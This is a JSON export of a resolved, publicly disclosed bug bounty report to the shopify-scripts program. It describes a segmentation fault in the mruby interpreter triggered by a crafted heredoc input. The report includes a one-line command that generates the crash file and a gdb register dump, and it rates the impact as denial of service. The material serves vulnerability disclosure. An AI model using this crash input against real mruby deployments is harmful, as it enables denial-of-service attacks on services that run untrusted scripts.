{
  "id": 297383,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTczODM=",
  "url": "https://hackerone.com/reports/297383",
  "title": "mruby heredoc notation",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2017-12-12T23:32:33.925Z",
  "submitted_at": "2017-12-12T23:32:33.925Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "j0s3",
    "url": "/j0s3",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-01-10T23:46:42.876Z",
  "bug_reporter_agreed_on_going_public_at": "2018-01-10T23:46:42.412Z",
  "team_member_agreed_on_going_public_at": "2017-12-18T22:45:08.033Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi\nThere exists a vulnerability in mruby when using the heredoc notation (it doesn't need ulimit)\n\nThe minified test can be generated with the following command:\n```\nruby -e 'IO.binwrite(\"j_3_.rb\", \"\\xa7<l while\\x270\\x27><<i\\x00\" + (\"\\x0a\" * 0x3ffd) + \"i\\x0a\")'\n```\n\nlog:\n```\nroot@Ubuntu-1604-xenial-64-minimal ~/jtest/mruby/bin # ulimit -Sv unlimited; ruby -e 'IO.binwrite(\"j_3_.rb\", \"\\xa7<l while\\x270\\x27><<i\\x00\" + (\"\\x0a\" * 0x3ffd) + \"i\\x0a\")'; rm core; ulimit -c unlimited; ./mruby j_3_.rb; gdb ./mruby core\nSegmentation fault (core dumped)\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./mruby...done.\n[New LWP 32567]\nCore was generated by `./mruby j_3_.rb'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x000000000041c7c2 in mrb_vm_exec (mrb=0xae2010, proc=0xd66440, pc=0x7ff884d18014)\n    at /root/jtest/mruby/src/vm.c:1231\n1231            JUMP;\n(gdb) x/5i $rip\n=> 0x41c7c2 <mrb_vm_exec+4535>: mov    (%rax),%eax\n   0x41c7c4 <mrb_vm_exec+4537>: mov    %eax,-0x8e0(%rbp)\n   0x41c7ca <mrb_vm_exec+4543>: mov    -0x8e0(%rbp),%eax\n   0x41c7d0 <mrb_vm_exec+4549>: and    $0x7f,%eax\n   0x41c7d3 <mrb_vm_exec+4552>: cltq\n(gdb) i r\nrax            0x7ff884d18014   140705356939284\nrbx            0x0      0\nrcx            0xaf7810 11499536\nrdx            0x10     16\nrsi            0x3      3\nrdi            0xae2010 11411472\nrbp            0x7ffcbd6af3b0   0x7ffcbd6af3b0\nrsp            0x7ffcbd6aeaa0   0x7ffcbd6aeaa0\nr8             0x414829 4278313\nr9             0x42f0fd 4387069\nr10            0x7ff884817b78   140705351695224\nr11            0x2e08   11784\nr12            0x4019c0 4200896\nr13            0x7ffcbd6af7e0   140723486390240\nr14            0x0      0\nr15            0x0      0\nrip            0x41c7c2 0x41c7c2 <mrb_vm_exec+4535>\neflags         0x10206  [ PF IF RF ]\ncs             0x33     51\nss             0x2b     43\nds             0x0      0\nes             0x0      0\nfs             0x0      0\ngs             0x0      0\n\n```\n\nThanks\n\n## Impact\n\nDoS",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-01-17T22:45:08.163Z",
  "allow_singular_disclosure_after": -191599842.8906449,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "bl4de",
    "eveeez",
    "cr4xerbik4sh",
    "japz"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
